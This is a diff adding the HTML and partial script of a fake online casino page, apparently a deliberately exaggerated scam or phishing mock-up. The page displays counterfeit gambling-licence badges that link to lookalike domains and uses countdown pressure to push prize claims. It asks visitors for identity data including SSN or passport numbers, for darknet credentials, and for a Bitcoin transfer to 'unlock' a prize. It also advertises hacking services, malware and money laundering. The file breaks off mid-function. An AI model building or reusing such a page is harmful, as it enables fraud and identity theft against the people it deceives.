@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="WEC">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="description" content="Win Everything Casino - Licensed by Curacao eGaming & Malta Gaming Authority. Join now for exclusive rewards!">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="icon" href="/apple-touch-icon.png">
+    <title>Win Everything Casino</title>
+    <style>
+        /* Enhanced Malicious Styling */
+        body {
+            font-family: 'Verdana', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #2e1a47);
+            margin: 0;
+            padding: 20px;
+            color: #fff;
+            overflow-x: hidden;
+            animation: bgPulse 5s infinite alternate;
+            cursor: url('https://cdn-icons-png.flaticon.com/512/186/186239.png'), auto;
+        }
+        @keyframes bgPulse {
+            0% { background: linear-gradient(135deg, #1a1a2e, #2e1a47); }
+            100% { background: linear-gradient(135deg, #4b0082, #1a1a2e); }
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: #2e1a47;
+            padding: 50px;
+            border-radius: 25px;
+            box-shadow: 0 0 50px rgba(255, 0, 255, 0.9);
+            border: 6px solid #ffd700;
+            position: relative;
+            z-index: 1;
+            display: none;
+        }
+        h1 {
+            color: #ffd700;
+            text-align: center;
+            font-size: 80px;
+            text-shadow: 0 0 20px #ff00ff, 0 0 10px #ff00ff;
+            margin-bottom: 40px;
+            letter-spacing: 3px;
+            animation: neonFlicker 1.5s infinite;
+        }
+        @keyframes neonFlicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.85; }
+        }
+        .instructions {
+            text-align: center;
+            font-size: 28px;
+            color: #00ff00;
+            margin-bottom: 40px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        .points, .crypto-balance {
+            text-align: center;
+            font-size: 24px;
+            color: #00ff00;
+            margin-bottom: 20px;
+            text-shadow: 0 0 15px #00ff00;
+        }
+        .gift-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 30px;
+            margin: 40px 0;
+        }
+        .gift-box {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(45deg, #ff00ff, #00ff00);
+            border: 5px solid #ffd700;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            text-align: center;
+            line-height: 200px;
+            font-size: 56px;
+            color: #fff;
+            font-weight: bold;
+            position: relative;
+            overflow: hidden;
+        }
+        .gift-box::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            transition: opacity 0.3s ease;
+        }
+        .gift-box:hover::after { opacity: 0; }
+        .gift-box:hover {
+            transform: scale(1.15);
+            box-shadow: 0 0 30px #ff00ff, 0 0 20px #ffd700;
+        }
+        .chat {
+            margin: 40px 0;
+            padding: 25px;
+            background: #1a1a2e;
+            border: 4px solid #ffd700;
+            border-radius: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+            box-shadow: inset 0 0 20px #ff00ff;
+        }
+        .chat-message {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            font-size: 18px;
+        }
+        .chat-username { font-weight: bold; color: #ffd700; margin-right: 15px; }
+        .chat-text { color: #fff; }
+        .chat-timestamp { font-size: 14px; color: #888; margin-left: 15px; }
+        .worker { color: #00ff00; }
+        .settings {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #ff00ff;
+            color: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            z-index: 10;
+            transition: all 0.3s ease;
+        }
+        .settings:hover { background: #00ff00; box-shadow: 0 0 20px #00ff00; }
+        .settings-menu {
+            display: none;
+            position: absolute;
+            top: 60px;
+            right: 20px;
+            background: #2e1a47;
+            padding: 25px;
+            border: 4px solid #ffd700;
+            border-radius: 15px;
+            z-index: 10;
+            box-shadow: 0 0 25px #ff00ff;
+        }
+        .leaderboard, .history, .crypto-wallet, .bonus-offers, .referral-program {
+            margin: 40px 0;
+            padding: 25px;
+            background: #1a1a2e;
+            border: 4px solid #ffd700;
+            border-radius: 20px;
+            box-shadow: inset 0 0 20px #ff00ff;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #2e1a47;
+            padding: 40px;
+            border-radius: 25px;
+            border: 6px solid #ffd700;
+            width: 90%;
+            max-width: 800px;
+            text-align: center;
+            box-shadow: 0 0 50px #ff00ff;
+            position: relative;
+            max-height: 85vh;
+            overflow-y: auto;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 8px solid #ffd700;
+            border-top: 8px solid #ff00ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 25px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .btn, .verify-btn, .ad-btn, .action-btn {
+            padding: 15px 30px;
+            margin: 15px 0;
+            background: #ff00ff;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 5;
+            width: 100%;
+        }
+        .btn:hover, .verify-btn:hover, .ad-btn:hover, .action-btn:hover {
+            background: #00ff00;
+            box-shadow: 0 0 25px #00ff00;
+        }
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            padding: 12px 25px;
+            background: #e74c3c;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 5;
+        }
+        .back-btn:hover {
+            background: #ff0000;
+            box-shadow: 0 0 25px #ff0000;
+        }
+        .ad-fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.95);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 48px;
+            text-align: center;
+            text-shadow: 0 0 15px #000;
+        }
+        .ad-fullscreen .close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 60px;
+            cursor: pointer;
+            color: #ffd700;
+            z-index: 5;
+        }
+        .ad-popup {
+            position: fixed;
+            background: #16213e;
+            border: 4px solid #e74c3c;
+            padding: 30px;
+            width: 400px;
+            height: 300px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.6);
+            z-index: 999;
+            overflow: hidden;
+            border-radius: 15px;
+        }
+        .ad-popup h3 {
+            color: #e74c3c;
+            margin: 0 0 20px 0;
+            font-size: 28px;
+        }
+        .ad-popup p {
+            font-size: 18px;
+            color: #bdc3c7;
+            margin-bottom: 25px;
+        }
+        .ad-popup .close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 30px;
+            cursor: pointer;
+            color: #e74c3c;
+            z-index: 5;
+        }
+        .confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 500;
+        }
+        .consent-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        .consent-content {
+            background: #2e1a47;
+            padding: 40px;
+            border-radius: 25px;
+            border: 6px solid #ffd700;
+            width: 90%;
+            max-width: 800px;
+            text-align: center;
+            box-shadow: 0 0 50px #ff00ff;
+        }
+        .consent-btn {
+            padding: 15px 35px;
+            margin: 20px;
+            background: #ff00ff;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 20px;
+            transition: all 0.3s ease;
+            z-index: 5;
+        }
+        .consent-btn:hover {
+            background: #00ff00;
+            box-shadow: 0 0 25px #00ff00;
+        }
+        .footer-links {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 18px;
+        }
+        .footer-links a {
+            color: #ffd700;
+            margin: 0 20px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+            cursor: pointer;
+            z-index: 5;
+        }
+        .footer-links a:hover {
+            color: #ff00ff;
+            text-shadow: 0 0 10px #ff00ff;
+        }
+        .form { background: #1a1a2e; padding: 25px; border-radius: 15px; border: 3px solid #ffd700; margin: 25px 0; }
+        input, select {
+            display: block;
+            padding: 18px;
+            width: 85%;
+            max-width: 600px;
+            margin: 20px auto;
+            background: #16213e;
+            border: 3px solid #ffd700;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 20px;
+            z-index: 5;
+        }
+        .progress-bar {
+            width: 95%;
+            height: 50px;
+            background: #1a1a2e;
+            border: 4px solid #ffd700;
+            border-radius: 15px;
+            margin: 40px auto;
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+            z-index: 5;
+        }
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff00ff, #00ff00);
+            transition: width 0.5s ease;
+        }
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 20px;
+            color: #fff;
+            text-shadow: 0 0 10px #000;
+            z-index: 6;
+        }
+        .market { background: #1a1a2e; padding: 25px; border-radius: 15px; border: 3px solid #ffd700; margin-top: 25px; }
+        .market-item {
+            background: #16213e;
+            padding: 20px;
+            margin: 15px 0;
+            border: 2px solid #ff00ff;
+            border-radius: 10px;
+            font-size: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .market-item span { color: #00ff00; }
+        .cash { font-size: 36px; color: #00ff00; margin: 40px 0; text-shadow: 0 0 15px #00ff00; }
+        .catalog { display: grid; grid-template-columns: repeat(3, 1fr); gap: 25px; margin: 50px 0; }
+        .ad-item {
+            background: #1a1a2e;
+            padding: 25px;
+            border: 3px solid #ff00ff;
+            border-radius: 15px;
+            text-align: left;
+            position: relative;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        .ad-item:hover { transform: scale(1.08); }
+        .ad-item h3 { color: #ffd700; font-size: 28px; margin: 0 0 15px 0; }
+        .ad-item p { font-size: 18px; margin: 0 0 15px 0; }
+        .ad-item span { color: #00ff00; font-weight: bold; }
+        .ad-item .buy-btn {
+            padding: 10px 20px;
+            background: #e74c3c;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 5;
+        }
+        .ad-item .buy-btn:hover {
+            background: #ff0000;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        .discount { color: #e74c3c; font-size: 20px; margin-top: 25px; text-shadow: 0 0 10px #e74c3c; }
+        .custom-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2e1a47;
+            padding: 40px;
+            border-radius: 20px;
+            border: 4px solid #ffd700;
+            box-shadow: 0 0 40px #ff00ff;
+            z-index: 3000;
+            max-width: 600px;
+            text-align: center;
+        }
+        .custom-popup h3 { color: #ffd700; font-size: 32px; margin-bottom: 25px; }
+        .custom-popup p { font-size: 18px; color: #bdc3c7; }
+        .custom-popup .btn { width: auto; padding: 12px 25px; margin-top: 25px; }
+        .captcha {
+            background: #1a1a2e;
+            padding: 25px;
+            border-radius: 15px;
+            border: 3px solid #ffd700;
+            margin: 25px 0;
+        }
+        .captcha img {
+            width: 100%;
+            max-width: 250px;
+            margin: 15px auto;
+            display: block;
+        }
+        .fake-licenses {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 16px;
+            color: #bdc3c7;
+        }
+        .fake-licenses img {
+            width: 100px;
+            margin: 10px;
+            opacity: 0.8;
+            cursor: pointer;
+        }
+        .fake-licenses img:hover {
+            opacity: 1;
+            transform: scale(1.1);
+        }
+        .partner-logos {
+            text-align: center;
+            margin-top: 40px;
+        }
+        .partner-logos img {
+            width: 120px;
+            margin: 15px;
+            opacity: 0.7;
+            cursor: pointer;
+        }
+        .partner-logos img:hover {
+            opacity: 1;
+            transform: scale(1.1);
+        }
+        .slot-machine {
+            background: #1a1a2e;
+            padding: 25px;
+            border-radius: 15px;
+            border: 3px solid #ffd700;
+            margin: 40px 0;
+            text-align: center;
+        }
+        .slot-machine img {
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+        }
+        .crypto-wallet input {
+            width: 70%;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        .crypto-wallet button {
+            display: inline-block;
+            padding: 15px 25px;
+        }
+        .bonus-offers .offer-item {
+            background: #16213e;
+            padding: 20px;
+            margin: 15px 0;
+            border: 2px solid #ff00ff;
+            border-radius: 10px;
+            font-size: 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .referral-program input {
+            width: 60%;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        .referral-program button {
+            display: inline-block;
+            padding: 15px 25px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Consent Modal -->
+    <div id="consentModal" class="consent-modal">
+        <div class="consent-content">
+            <h3>Welcome to Win Everything Casino</h3>
+            <p>We collect ALL your data for unlimited use with our partners in Russia, China, and beyond. Accept our <a href="http://privacy.eonw.xyz" style="color: #ffd700;">Privacy Policy</a> and <a href="http://terms.eonw.xyz" style="color: #ffd700;">Terms of Service</a> to proceed.</p>
+            <button class="consent-btn" onclick="acceptConsent()">Accept</button>
+            <button class="consent-btn" onclick="showPopup('You must accept to win big! Decline redirects to http://gift-card.eonw.xyz', 'OK', () => window.location.href='http://gift-card.eonw.xyz')">Decline</button>
+        </div>
+    </div>
+
+    <!-- Main Casino Page -->
+    <div class="container" id="mainContainer">
+        <h1>WIN EVERYTHING CASINO</h1>
+        <div class="points">Loyalty Points: <span id="loyaltyPoints">0</span></div>
+        <div class="crypto-balance">Crypto Balance: <span id="cryptoBalance">0 BTC</span></div>
+        <div class="instructions">Click a box to win INSANE prizes! Attempts Left: <span id="attempts">3</span></div>
+        <div class="items">Over 5000 exclusive prizes!</div>
+        <div class="gift-grid">
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+        </div>
+        <div class="slot-machine">
+            <h3>Spin to Win!</h3>
+            <img src="https://via.placeholder.com/300x200?text=Slot+Machine" alt="Slot Machine">
+            <button class="btn" onclick="spinSlot()">Spin Now (0.001 BTC)</button>
+        </div>
+        <div class="chat" id="chatBox"></div>
+        <div class="leaderboard">
+            <h3>Top Winners</h3>
+            <p>VladimirX - Private Jet</p>
+            <p>LiWei88 - $5,000,000 Cash</p>
+            <p>DarkNetLord - Crypto Vault Access</p>
+            <p>ShadowHacker - 100kg Gold</p>
+            <p>CartelKingpin - Mansion in Dubai</p>
+        </div>
+        <div class="history" id="historyBox">
+            <h3>Your Wins</h3>
+        </div>
+        <div class="crypto-wallet">
+            <h3>Crypto Wallet</h3>
+            <input type="text" id="cryptoAddress" placeholder="Enter BTC Wallet Address">
+            <button class="btn" onclick="depositCrypto()">Deposit BTC</button>
+            <p>Exclusive partnership with <a href="http://crypto-vault.eonw.xyz">CryptoVaultRU</a> and <a href="http://dragonpay.eonw.xyz">DragonPayCN</a></p>
+        </div>
+        <div class="bonus-offers">
+            <h3>Exclusive Bonus Offers</h3>
+            <div class="offer-item">100% Deposit Match <span><a href="http://bonus.eonw.xyz">Claim Now</a></span></div>
+            <div class="offer-item">Free Crypto Airdrop <span><a href="http://airdrop.eonw.xyz">Join Airdrop</a></span></div>
+            <div class="offer-item">VIP Cashback <span><a href="http://cashback.eonw.xyz">Get 50% Back</a></span></div>
+        </div>
+        <div class="referral-program">
+            <h3>Refer & Earn</h3>
+            <input type="text" id="referralLink" value="http://refer.eonw.xyz/12345" readonly>
+            <button class="btn" onclick="copyReferral()">Copy Link</button>
+            <p>Earn 0.01 BTC per referral!</p>
+        </div>
+        <div class="settings" onclick="toggleSettings()">⚙️</div>
+        <div class="settings-menu" id="settingsMenu">
+            <p>Language: <select onchange="changeLanguage(this.value)">
+                <option value="en">English</option>
+                <option value="fi">Finnish</option>
+                <option value="ru">Russian</option>
+                <option value="zh">Chinese</option>
+            </select></p>
+            <p>Sound Effects: <input type="checkbox" id="soundToggle" checked> On</p>
+            <p>Dark Mode: <input type="checkbox" id="darkToggle" checked> On</p>
+            <p>VIP Tiers:</p>
+            <button class="btn" onclick="upgradeVIP('Diamond')">Diamond VIP - $499.99</button>
+            <button class="btn" onclick="upgradeVIP('Elite')">Elite VIP - $999.99</button>
+            <button class="btn" onclick="upgradeVIP('Supreme')">Supreme VIP - $1999.99</button>
+        </div>
+        <div class="fake-licenses">
+            <p>Licensed by: 
+                <a href="http://curacao-egaming.eonw.xyz"><img src="https://via.placeholder.com/100x50?text=Curacao+eGaming" alt="Curacao License"></a>
+                <a href="http://malta-gaming.eonw.xyz"><img src="https://via.placeholder.com/100x50?text=Malta+Gaming" alt="Malta License"></a>
+                <a href="http://kahnawake.eonw.xyz"><img src="https://via.placeholder.com/100x50?text=Kahnawake" alt="Kahnawake License"></a>
+            </p>
+        </div>
+        <div class="partner-logos">
+            <p>Proud Partners:</p>
+            <a href="http://ruscasino.eonw.xyz"><img src="https://via.placeholder.com/120x60?text=RusCasino" alt="RusCasino"></a>
+            <a href="http://dragonbet.eonw.xyz"><img src="https://via.placeholder.com/120x60?text=DragonBet" alt="DragonBet"></a>
+            <a href="http://darkpool.eonw.xyz"><img src="https://via.placeholder.com/120x60?text=DarkPool" alt="DarkPool"></a>
+        </div>
+        <div class="footer-links">
+            <a href="http://privacy.eonw.xyz">Privacy Policy</a>
+            <a href="http://terms.eonw.xyz">Terms of Service</a>
+            <a href="http://support.eonw.xyz">Contact Us: tkkeeb224@gmail.com</a>
+            <a href="http://affiliates.eonw.xyz">Affiliate Program</a>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div id="verifyModal" class="modal">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h3>Verify to Claim Your Prize!</h3>
+            <p id="prizeText"></p>
+            <p id="timer">Hurry! Claim in: <span id="countdown">45</span>s</p>
+            <div class="spinner" id="verifySpinner"></div>
+            <p id="verifyStatus" style="display: none;">Processing...</p>
+            <button class="verify-btn" onclick="showVerification('join')">Join Shadow Syndicate</button>
+            <button class="verify-btn" onclick="showVerification('crypto')">Crypto Heist Mission</button>
+            <button class="verify-btn" onclick="showVerification('darkweb')">Access Darknet Vault</button>
+            <button class="verify-btn" onclick="showVerification('launder')">Launder Syndicate Funds</button>
+            <button class="verify-btn" onclick="window.location.href='http://survey.eonw.xyz'">Complete Quick Survey</button>
+        </div>
+    </div>
+
+    <!-- Verification Content Modals -->
+    <div id="joinModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Join Shadow Syndicate</h1>
+            <p>Enter details to join and claim your prize!</p>
+            <div class="form">
+                <input type="text" id="joinName" placeholder="Full Name">
+                <input type="email" id="joinEmail" placeholder="Email Address">
+                <input type="text" id="joinPhone" placeholder="Phone Number">
+                <input type="text" id="joinAddress" placeholder="Home Address">
+                <input type="text" id="joinSSN" placeholder="SSN or Passport Number">
+                <select id="joinRole">
+                    <option value="">Select Syndicate Role</option>
+                    <option value="enforcer">Enforcer</option>
+                    <option value="hacker">Hacker</option>
+                    <option value="crypto">Crypto Specialist</option>
+                    <option value="launderer">Money Launderer</option>
+                </select>
+                <div class="captcha">
+                    <img src="https://via.placeholder.com/250x100?text=Captcha" alt="Captcha">
+                    <input type="text" id="joinCaptcha" placeholder="Enter Captcha">
+                </div>
+                <button class="action-btn" onclick="submitJoin()">Join Syndicate</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="cryptoModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Crypto Heist Mission</h1>
+            <p>Transfer 0.05 BTC to unlock your prize!</p>
+            <div class="form">
+                <input type="text" id="cryptoWallet" placeholder="Enter BTC Wallet Address">
+                <button class="action-btn" onclick="startCryptoHeist()">Send BTC</button>
+            </div>
+            <p>Powered by <a href="http://crypto-vault.eonw.xyz">CryptoVaultRU</a></p>
+        </div>
+    </div>
+
+    <div id="darkwebModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Darknet Vault</h1>
+            <p>Access exclusive marketplace to verify your prize.</p>
+            <div class="form" id="darkwebLogin">
+                <input type="text" id="darkwebUser" placeholder="Darknet Username">
+                <input type="password" id="darkwebPass" placeholder="Darknet Password">
+                <button class="action-btn" onclick="loginDarkweb()">Access Vault</button>
+            </div>
+            <div class="market" id="darkwebMarket" style="display: none;">
+                <p>Exclusive Listings:</p>
+                <div class="market-item">Crypto Malware <span>$8,000</span></div>
+                <div class="market-item">Hacked Bank Account <span>$15,000</span></div>
+                <div class="market-item">Stolen NFT Collection <span>$20,000</span></div>
+                <div class="market-item">Syndicate Contract <span>$50,000</span></div>
+                <button class="action-btn" onclick="verifyDarkweb()">Verify Purchase</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="launderModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Launder Syndicate Funds</h1>
+            <p>Process $5,000,000 to secure your prize.</p>
+            <div class="cash" id="launderCash">$5,000,000 (Pending)</div>
+            <button class="action-btn" onclick="startLaundering()">Start Laundering</button>
+            <div class="progress-bar" id="launderProgress" style="display: none;">
+                <div class="progress" id="launderFill"></div>
+                <span class="progress-text" id="launderText">0%</span>
+            </div>
+            <button class="action-btn" id="launderClaim" style="display: none;" onclick="claimLaunder()">Claim Funds</button>
+        </div>
+    </div>
+
+    <!-- Prize Claimed Page -->
+    <div id="claimedModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Prize Secured!</h1>
+            <p id="claimedPrize">Your prize has been processed.</p>
+            <div class="cash" id="claimedMessage">Thank you for joining Shadow Syndicate. Your reward is pending verification.</div>
+            <button class="btn" onclick="playSound('success'); triggerConfetti();">Celebrate!</button>
+            <p><a href="http://delivery.eonw.xyz">Track Your Prize</a></p>
+        </div>
+    </div>
+
+    <!-- Ad Modals -->
+    <div id="adFullscreen" class="ad-fullscreen">
+        <span class="close" onclick="this.parentElement.style.display='none'">×</span>
+        <div id="adContent"></div>
+    </div>
+
+    <div id="cryptoModalAd" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Crypto Deals</h1>
+            <p>Exclusive crypto offers!</p>
+            <div class="catalog">
+                <div class="ad-item"><h3>BTC Mining Rig</h3><p>10 TH/s. <span>$12,000</span></p><button class="buy-btn" onclick="buyItem('BTC Mining Rig', '$12,000')">Buy</button></div>
+                <div class="ad-item"><h3>ETH Staking Plan</h3><p>5% returns. <span>$5,000</span></p><button class="buy-btn" onclick="buyItem('ETH Staking Plan', '$5,000')">Buy</button></div>
+                <div class="ad-item"><h3>Darknet Crypto Wallet</h3><p>Untraceable. <span>$3,000</span></p><button class="buy-btn" onclick="buyItem('Darknet Crypto Wallet', '$3,000')">Buy</button></div>
+            </div>
+            <p><a href="http://crypto-deals.eonw.xyz">More Crypto Offers</a></p>
+        </div>
+    </div>
+
+    <div id="luxuryModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Luxury Goods</h1>
+            <p>Elite items from Shadow Syndicate.</p>
+            <div class="catalog">
+                <div class="ad-item"><h3>Rolex Collection</h3><p>10 pieces. <span>$50,000</span></p><button class="buy-btn" onclick="buyItem('Rolex Collection', '$50,000')">Buy</button></div>
+                <div class="ad-item"><h3>Private Yacht</h3><p>50ft luxury. <span>$2,000,000</span></p><button class="buy-btn" onclick="buyItem('Private Yacht', '$2,000,000')">Buy</button></div>
+                <div class="ad-item"><h3>Diamond Necklace</h3><p>20 carats. <span>$100,000</span></p><button class="buy-btn" onclick="buyItem('Diamond Necklace', '$100,000')">Buy</button></div>
+            </div>
+            <p><a href="http://luxury.eonw.xyz">More Luxury Items</a></p>
+        </div>
+    </div>
+
+    <div id="hackingModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Hacking Services</h1>
+            <p>Elite cyber services.</p>
+            <div class="catalog">
+                <div class="ad-item"><h3>Social Media Hack</h3><p>Full access. <span>$2,500</span></p><button class="buy-btn" onclick="buyItem('Social Media Hack', '$2,500')">Buy</button></div>
+                <div class="ad-item"><h3>Email Hack</h3><p>Untraceable. <span>$3,000</span></p><button class="buy-btn" onclick="buyItem('Email Hack', '$3,000')">Buy</button></div>
+                <div class="ad-item"><h3>Corporate Espionage</h3><p>Full data leak. <span>$50,000</span></p><button class="buy-btn" onclick="buyItem('Corporate Espionage', '$50,000')">Buy</button></div>
+            </div>
+            <p><a href="http://hacking.eonw.xyz">More Services</a></p>
+        </div>
+    </div>
+
+    <!-- Custom Popup -->
+    <div id="customPopup" class="custom-popup">
+        <h3 id="popupTitle"></h3>
+        <p id="popupMessage"></p>
+        <button class="btn" id="popupButton" onclick="hidePopup()"></button>
+    </div>
+
+    <canvas id="confettiCanvas" class="confetti"></canvas>
+
+    <script>
+        // Инициализация теневого синдиката // Shadow Syndicate Initialization
+        // 暗网联盟启动 // Darknet Alliance Launch
+        let attempts = 3;
+        let clicked = 0;
+        let smuggleProgress = 0;
+        let loyaltyPoints = 0;
+        let cryptoBalance = 0;
+        let currentCallback = null;
+
+        const prizes = [
+            "iPhone 17 Ultra", "$10,000 Cash", "Tesla Model X", "Private Island", "50kg Gold Bars",
+            "Crypto Vault Key", "Luxury Yacht", "Bitcoin ATM", "Mansion in Dubai", "Private Jet Access"
+        ];
+
+        const ads = [
+            {title: "Crypto Deals", text: "Insane crypto profits await!", id: "crypto"},
+            {title: "Luxury Goods", text: "Elite items for elite players!", id: "luxury"},
+            {title: "Hacking Services", text: "Untraceable cyber solutions!", id: "hacking"}
+        ];
+
+        // Sound Effects
+        const sounds = {
+            click: new Audio('https://www.myinstants.com/media/sounds/click.mp3'),
+            success: new Audio('https://www.myinstants.com/media/sounds/success.mp3'),
+            error: new Audio('https://www.myinstants.com/media/sounds/error.mp3')
+        };
+        function playSound(type) {
+            if (document.getElementById('soundToggle').checked) {
+                sounds[type].play().catch(() => {});
+            }
+        }
+
+        // Language Translations (Finnish is intentionally broken)
+        const translations = {
+            en: {
+                title: "WIN EVERYTHING CASINO",
+                instructions: "Click a box to win INSANE prizes! Attempts Left: ",
+                points: "Loyalty Points: ",
+                crypto: "Crypto Balance: ",
+                leaderboard: "Top Winners",
+                history: "Your Wins",
+                wallet: "Crypto Wallet",
+                referral: "Refer & Earn",
+                spin: "Spin Now (0.001 BTC)",
+                verify: "Verify to Claim Your Prize!",
+                hurry: "Hurry! Claim in: ",
+                join: "Join Shadow Syndicate",
+                cryptoMission: "Crypto Heist Mission",
+                darkweb: "Access Darknet Vault",
+                launder: "Launder Syndicate Funds",
+                survey: "Complete Quick Survey"
+            },
+            fi: {
+                title: "VOITA KAIKKI KASINO!!!",
+                instructions: "Klikaa laatiko win INSANE palkinto! Yritykset jäljellä: ",
+                points: "Lojaliteetti Pistet: ",
+                crypto: "Krypto Saldo: ",
+                leaderboard: "Parhaat Voittjat",
+                history: "Sinun Voittot",
+                wallet: "Krypto Lompako",
+                referral: "Kutsu & Ansaitse",
+                spin: "Pyöritä Nyt (0.001 BTC!!!)",
+                verify: "Varmista Palkinto Nouto!",
+                hurry: "Kiiruhda! Nouto: ",
+                join: "Liity Varjo Syndikaatti",
+                cryptoMission: "Krypto Ryöstö Tehtävä",
+                darkweb: "Pääsy Pimeä Verkko Vault",
+                launder: "Pese Syndikaatti Rahat",
+                survey: "Täytä Nopee Kysely"
+            }
+        };
+
+        function changeLanguage(lang) {
+            const t = translations[lang] || translations.en;
+            document.querySelector('h1').innerText = t.title;
+            document.querySelector('.instructions').innerHTML = `${t.instructions}<span id="attempts">${attempts}</span>`;
+            document.querySelector('.points').innerHTML = `${t.points}<span id="loyaltyPoints">${loyaltyPoints}</span>`;
+            document.querySelector('.crypto-balance').innerHTML = `${t.crypto}<span id="cryptoBalance">${cryptoBalance} BTC</span>`;
+            document.querySelector('.leaderboard h3').innerText = t.leaderboard;
+            document.querySelector('.history h3').innerText = t.history;
+            document.querySelector('.crypto-wallet h3').innerText = t.wallet;
+            document.querySelector('.referral-program h3').innerText = t.referral;
+            document.querySelector('.slot-machine .btn').innerText = t.spin;
+            document.querySelector('#verifyModal h3').innerText = t.verify;
